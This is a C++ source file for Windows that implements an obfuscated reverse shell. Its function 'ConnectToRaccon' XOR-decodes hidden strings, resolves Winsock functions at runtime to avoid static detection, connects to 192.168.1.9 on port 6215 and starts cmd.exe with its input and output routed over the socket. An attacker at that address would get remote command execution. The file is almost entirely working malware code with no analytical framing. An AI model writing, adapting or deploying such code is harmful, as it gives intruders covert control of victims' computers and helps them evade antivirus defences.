#include <winsock2.h>  
#include <ws2tcpip.h>  
#include <Windows.h>

void rox(BYTE* buffer, size_t bufferLength, const BYTE key)
{
    for (int i = 0; i < bufferLength; i++)
    {
        buffer[i] ^= key;
    }
}


int ConnectToRaccon(void)
{
    BYTE dl[] = { 0x88, 0x8C, 0xCD, 0xA0, 0xCC, 0xCD, 0xD1, 0x9B, 0x93, 0x93, 0x00 };
    const BYTE key = 0xFF;
    rox(dl, (size_t)sizeof(dl) - 1, key);

    HMODULE hModule = GetModuleHandleA(reinterpret_cast<char*>(dl));

    if (hModule == NULL)
    {
        hModule = LoadLibraryA(reinterpret_cast<char*>(dl));
    }

    BYTE wsp[] = { 0xA8, 0xAC, 0xBE, 0xAC, 0x8B, 0x9E, 0x8D, 0x8B, 0x8A, 0x8F, 0x00 }; // 1
    BYTE wssa[] = { 0xA8, 0xAC, 0xBE, 0xAC, 0x90, 0x9C, 0x94, 0x9A, 0x8B, 0xBE, 0x00 }; // 2
    BYTE wscon[] = { 0xA8, 0xAC, 0xBE, 0xBC, 0x90, 0x91, 0x91, 0x9A, 0x9C, 0x8B, 0x00 }; // 3
    BYTE ht[] = { 0x97, 0x8B, 0x90, 0x91, 0x8C, 0x00 }; // 4
    BYTE ipt[] = { 0x96, 0x91, 0x9A, 0x8B, 0xA0, 0x8F, 0x8B, 0x90, 0x91, 0x00 }; // 5

    rox(wsp, (size_t)sizeof(wsp) - 1, key); // 1
    rox(wssa, (size_t)sizeof(wssa) - 1, key); // 2
    rox(wscon, (size_t)sizeof(wscon) - 1, key); // 3
    rox(ht, (size_t)sizeof(ht) - 1, key); // 4
    rox(ipt, (size_t)sizeof(ipt) - 1, key); // 5

    typedef int (WINAPI* StartUp)(WORD, LPWSADATA);
    typedef SOCKET(WINAPI* Soc)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
    typedef int (WINAPI* Noc)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
    typedef u_short(WINAPI* HTONS)(u_short);
    typedef int (WINAPI* INET_PTON)(int, const char*, void*);
    // typedef int (WINAPI* Clean)();

    WSADATA asw;

    StartUp sstartupFunc = (StartUp)(GetProcAddress(hModule, reinterpret_cast<char*>(wsp)));
    Soc sockFunc = (Soc)(GetProcAddress(hModule, reinterpret_cast<char*>(wssa)));
    Noc nocFunc = (Noc)(GetProcAddress(hModule, reinterpret_cast<char*>(wscon)));
    HTONS p_htons = (HTONS)(GetProcAddress(hModule, reinterpret_cast<char*>(ht)));
    INET_PTON p_inet_pton = (INET_PTON)(GetProcAddress(hModule, reinterpret_cast<char*>(ipt)));

    sstartupFunc(MAKEWORD(2, 2), &asw);
    SOCKET sock = sockFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sockaddr_in sockAddr;
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = p_htons(6215);
    BYTE house[] = { 0xCE, 0xC6, 0xCD, 0xD1, 0xCE, 0xC9, 0xC7, 0xD1, 0xCE, 0xCA, 0xD1, 0xC6, 0x00 };
    rox(house, sizeof(house) - 1, key);
    p_inet_pton(AF_INET, reinterpret_cast<char*>(house), &sockAddr.sin_addr);
    nocFunc(sock, (const struct sockaddr*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    BYTE elliot[] = { 0xBC, 0xC5, 0xA3, 0xA8, 0x96, 0x91, 0x9B, 0x90, 0x88, 0x8C, 0xA3, 0xAC, 0x86, 0x8C, 0x8B, 0x9A, 0x92, 0xCC, 0xCD, 0xA3, 0x9C, 0x92, 0x9B, 0xD1, 0x9A, 0x87, 0x9A, 0x00 };
    rox(elliot, sizeof(elliot) - 1, key);

    if (!CreateProcessA(reinterpret_cast<char*>(elliot), NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        return EXIT_FAILURE;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hModule);
    // WSACleanup();

    return EXIT_SUCCESS;
}

int main(void)
{
	return 1;
}